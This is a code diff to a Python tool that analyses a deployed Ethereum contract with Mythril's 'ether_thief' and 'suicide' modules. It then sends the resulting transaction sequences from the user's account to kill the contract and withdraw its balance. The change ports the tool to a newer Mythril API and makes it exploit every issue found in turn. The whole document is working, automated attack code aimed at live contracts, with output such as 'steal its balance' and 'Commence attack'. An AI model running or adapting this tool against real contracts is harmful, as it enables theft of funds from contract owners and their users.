@@ -4,14 +4,19 @@ import os
 import re
 import sys
 import json
-from mythril.mythril import Mythril
+from typing import List, Dict
 from web3 import Web3, HTTPProvider
 from configparser import ConfigParser
 from enum import Enum
+from mythril.mythril import (
+    MythrilAnalyzer,
+    MythrilDisassembler,
+    MythrilConfig,
+)
 
 # Uncomment the lines below to get verbose logging.
-# import logging
-# logging.basicConfig(level=logging.INFO)
+import logging
+logging.basicConfig(level=logging.INFO)
 
 
 class InvulnerableError(Exception):
@@ -25,18 +30,22 @@ class VulnType(Enum):
 
 
 class Vulnerability:
-    def __init__(self, type, description, transactions):
-        self.type = type
+    def __init__(self, _type : str, description : str, tx_sequence: List[Dict]):
+        self._type = _type
         self.description = description
-        self.transactions = transactions
+        self.tx_sequence = tx_sequence
 
 
-def critical(message):
+def split_args(data: str) -> List:
+    return list((data[i:64+i] for i in range(0, len(data), 64)))
+
+
+def critical(message: str) -> None:
     print(message)
     sys.exit()
 
 
-def w3_request_blocking(sender, receiver, value, data):
+def w3_request_blocking(sender, receiver, value, data) -> str:
     tx_hash = w3.eth.sendTransaction(
         {"to": receiver, "from": sender, "data": data, "value": value, "gas": 5000000}
     )
@@ -49,42 +58,41 @@ def w3_request_blocking(sender, receiver, value, data):
     return tx_hash
 
 
-def get_vulns(target_address, tx_count):
-    myth = Mythril(enable_online_lookup=False, onchain_storage_access=True)
+def get_vulns(target_address: str, tx_count: int) -> List[Vulnerability]:
 
-    if re.match(r"^https", rpc):
-        rpchost = rpc[8:]
-        rpctls = True
-    else:
-        rpchost = rpc[7:]
-        rpctls = False
-
-    myth.set_api_rpc(rpchost, rpctls)
-    myth.load_from_address(target_address)
-
-    report = myth.fire_lasers(
-        strategy="dfs",
-        modules=["ether_thief", "suicide"],
-        address=target_address,
-        execution_timeout=45,
-        max_depth=22,
-        transaction_count=tx_count,
-        verbose_report=True,
+    disassembler = MythrilDisassembler(
+        eth=conf.eth,
+        enable_online_lookup=False
     )
 
-    nIssues = len(report.issues)
+    disassembler.load_from_address(target_address)
 
-    if nIssues == 0:
+    analyzer = MythrilAnalyzer(
+        strategy="bfs",
+        disassembler=disassembler,
+        address=target_address,
+        execution_timeout=60,
+        max_depth = 32,
+        loop_bound=3,
+        disable_dependency_pruning=False,
+        onchain_storage_access=True
+    )
+
+    report = analyzer.fire_lasers(
+        modules=["ether_thief", "suicide"],
+        transaction_count=tx_count,
+    )
+
+    n_issues = len(report.issues)
+
+    if n_issues == 0:
         raise InvulnerableError
 
     vulns = []
 
-    for i in range(0, nIssues):
+    for i in range(0, n_issues):
+
         issue = report.sorted_issues()[i]
-
-        tx = issue["debug"].replace("\n", " ").replace("'", '"')
-        transactions = json.loads(tx)
-
         if "withdraw its balance" in issue["description"]:
             _type = VulnType.KILL_AND_WITHDRAW
             description = "Looks line anyone can kill this contract and steal its balance."
@@ -95,7 +103,8 @@ def get_vulns(target_address, tx_count):
             _type = VulnType.KILL_ONLY
             description = "Anybody can accidentally kill this contract."
 
-        vulns.append(Vulnerability(_type, description, transactions))
+        tx_sequence = json.loads(issue['tx_sequence'])
+        vulns.append(Vulnerability(_type, description, tx_sequence))
 
     if len(vulns):
         return vulns
@@ -103,14 +112,20 @@ def get_vulns(target_address, tx_count):
     raise InvulnerableError
 
 
-def commence_attack(sender_address, target_address, vuln):
-    print(vuln.description)
+def exploit_vuln(sender_address: str, target_address: str, vuln: Vulnerability) -> None:
 
-    for _id, tx in vuln.transactions.items():
-        data = tx["calldata"].replace(
+    for step in vuln.tx_sequence['steps']:
+
+        data = step["input"].replace(
             "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", sender_address[2:]
         )
-        value = int(tx["call_value"], 16)
+
+        funchash = data[:10]
+        args = split_args(data[10:])
+
+        print("Suggested calldata: Function hash: {}\nArgs: {}".format(funchash, args))
+
+        value = int(step["value"], 16)
 
         print(
             "You are about to send the following transaction:\nFrom: %s, To: %s, Value: %d\nData: %s"
@@ -165,6 +180,17 @@ except ValueError as e:
 
 w3 = Web3(HTTPProvider(rpc))
 
+conf = MythrilConfig()
+
+if re.match(r"^https", rpc):
+    rpchost = rpc[8:]
+    rpctls = True
+else:
+    rpchost = rpc[7:]
+    rpctls = False
+
+conf.set_api_rpc(rpchost, rpctls)
+
 # Commence attack
 
 print(
@@ -176,17 +202,18 @@ balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
 print("Your initial account balance is %.05f ETH.\nCharging lasers..." % balance)
 
-# FIXME: Handle multiple issues being returned
-
 try:
-    vuln = get_vulns(target_address, tx_count)[0]
+    vulns = get_vulns(target_address, tx_count)
 except InvulnerableError:
     critical("No attack vector found.")
 except Exception as e:
     critical("Error during analysis: %s" % str(e))
 
 target_balance = w3.eth.getBalance(target_address)
-commence_attack(sender_address, target_address, vuln)
+
+for vuln in vulns:
+    print(vuln.description)
+    exploit_vuln(sender_address, target_address, vuln)
 
 _balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
